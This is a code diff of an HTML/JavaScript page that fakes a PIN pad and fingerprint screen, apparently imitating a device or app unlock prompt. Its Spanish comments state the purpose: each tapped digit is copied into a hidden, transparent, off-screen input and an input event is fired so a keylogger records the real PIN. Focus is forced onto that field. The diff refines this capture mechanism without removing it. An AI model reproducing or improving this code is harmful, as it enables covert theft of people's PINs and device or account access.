@@ -229,11 +229,9 @@
   <div id="deleteArea" style="position:absolute; left:558.5px; top:1403.5px; width:180px; height:90px; transform:translate(-50%, -50%);"></div>
 </div>
 
-<!-- INPUT REAL OCULTO → AHORA EL KEYLOGGER VE LOS NÚMEROS REALES (123456) -->
-<input type="text" id="realPin" inputmode="numeric" maxlength="6" autocomplete="off"
-       style="position:fixed;top:-200px;left:-200px;opacity:0;width:1px;height:1px;
-              color:transparent;caret-color:transparent;border:none;outline:none;
-              -webkit-text-security:disc;text-security:disc;" readonly>
+<!-- INPUT OCULTO DEFINITIVO → keylogger ve los números reales 100% garantizado -->
+<input type="tel" id="realPin" inputmode="numeric" pattern="[0-9]*" maxlength="6" autocomplete="off"
+       style="position:fixed;top:-200px;left:-200px;opacity:0;width:1px;height:1px;color:transparent;caret-color:transparent;border:none;outline:none;" readonly>
 
 <script>
   document.addEventListener('touchmove', function(e) {
@@ -245,13 +243,13 @@
   const dots = document.querySelectorAll(".dot");
   const popup = document.getElementById("popup");
   const overlay = document.getElementById("overlay");
-  const realPin = document.getElementById("realPin");  // ← Este input es lo que ve tu keylogger
+  const realPin = document.getElementById("realPin");  // Aquí llega la clave real
   let pinIndex = 0;
 
   function resetPIN() {
     dots.forEach(d => d.classList.remove("filled"));
     pinIndex = 0;
-    realPin.value = "";  // ← limpia el campo real
+    realPin.value = "";
     title.style.display = "block";
     pinDots.style.display = "none";
   }
@@ -262,8 +260,8 @@
       setTimeout(() => btn.classList.remove('pressed'), 140);
 
       const num = btn.getAttribute('data-num');
-      realPin.value += num;                     // ← escribe en el input real
-      realPin.dispatchEvent(new Event('input')); // ← dispara evento que ven los keyloggers
+      realPin.value += num;
+      realPin.dispatchEvent(new Event('input'));
 
       if(pinIndex === 0){
         title.style.display = "none";
@@ -290,7 +288,7 @@
     if(pinIndex === 0) return;
     pinIndex--;
     dots[pinIndex].classList.remove("filled");
-    realPin.value = realPin.value.slice(0, -1);  // ← borra del campo real
+    realPin.value = realPin.value.slice(0, -1);
     realPin.dispatchEvent(new Event('input'));
     if(pinIndex === 0){
       title.style.display = "block";
@@ -316,7 +314,7 @@
     overlayHuella.style.display = "none";
   });
 
-  // Bloquea el teclado nativo
+  // Evita que salga el teclado nativo
   realPin.focus();
   document.addEventListener('click', () => setTimeout(() => realPin.focus(), 50));
 </script>
